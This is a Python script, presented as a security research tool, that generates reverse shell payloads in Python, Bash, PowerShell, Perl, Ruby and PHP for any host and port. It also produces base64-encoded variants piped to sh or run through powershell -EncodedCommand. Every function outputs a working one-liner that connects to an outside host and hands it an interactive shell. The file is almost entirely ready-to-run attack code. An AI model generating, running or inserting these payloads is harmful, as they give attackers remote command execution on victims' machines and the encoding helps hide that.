#!/usr/bin/env python3
"""
Reverse Shell Payload Generator
Author: Security Research Team
"""

import base64
import socket

def generate(host: str = "127.0.0.1", port: int = 4444, language: str = "python", **kwargs) -> str:
    """Generate reverse shell payload"""
    
    if language.lower() == "python" or language.lower() == "py":
        return generate_python_shell(host, port)
    elif language.lower() == "bash":
        return generate_bash_shell(host, port)
    elif language.lower() == "powershell" or language.lower() == "ps":
        return generate_powershell_shell(host, port)
    elif language.lower() == "perl":
        return generate_perl_shell(host, port)
    elif language.lower() == "ruby":
        return generate_ruby_shell(host, port)
    elif language.lower() == "php":
        return generate_php_shell(host, port)
    else:
        return generate_python_shell(host, port)


def generate_python_shell(host: str, port: int) -> str:
    """Generate Python reverse shell"""
    payload = f"""python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'"""
    
    # Also provide base64 encoded version
    encoded = base64.b64encode(payload.encode()).decode()
    encoded_payload = f"echo {encoded} | base64 -d | sh"
    
    return f"""
Python Reverse Shell:
{payload}

Base64 Encoded:
{encoded_payload}
"""


def generate_bash_shell(host: str, port: int) -> str:
    """Generate Bash reverse shell"""
    payloads = [
        f"bash -i >& /dev/tcp/{host}/{port} 0>&1",
        f"0<&196;exec 196<>/dev/tcp/{host}/{port}; sh <&196 >&196 2>&196",
        f"/bin/bash -l > /dev/tcp/{host}/{port} 0<&1 2>&1",
    ]
    
    result = "Bash Reverse Shell Payloads:\n\n"
    for i, payload in enumerate(payloads, 1):
        result += f"{i}. {payload}\n"
    
    return result


def generate_powershell_shell(host: str, port: int) -> str:
    """Generate PowerShell reverse shell"""
    payload = f"""$client = New-Object System.Net.Sockets.TCPClient("{host}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"""
    
    # One-liner version
    oneliner = payload.replace('\n', ' ').replace('  ', ' ')
    
    # Base64 encoded
    encoded = base64.b64encode(oneliner.encode('utf-16le')).decode()
    encoded_payload = f"powershell -EncodedCommand {encoded}"
    
    return f"""
PowerShell Reverse Shell:

One-liner:
{oneliner}

Base64 Encoded:
{encoded_payload}
"""


def generate_perl_shell(host: str, port: int) -> str:
    """Generate Perl reverse shell"""
    payload = f"""perl -e 'use Socket;$i="{host}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};'"""
    return f"Perl Reverse Shell:\n{payload}"


def generate_ruby_shell(host: str, port: int) -> str:
    """Generate Ruby reverse shell"""
    payload = f"""ruby -rsocket -e 'f=TCPSocket.open("{host}",{port}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'"""
    return f"Ruby Reverse Shell:\n{payload}"


def generate_php_shell(host: str, port: int) -> str:
    """Generate PHP reverse shell"""
    payload = f"""php -r '$sock=fsockopen("{host}",{port});exec("/bin/sh -i <&3 >&3 2>&3");'"""
    return f"PHP Reverse Shell:\n{payload}"


if __name__ == "__main__":
    import sys
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 4444
    lang = sys.argv[3] if len(sys.argv) > 3 else "python"
    print(generate(host, port, lang))
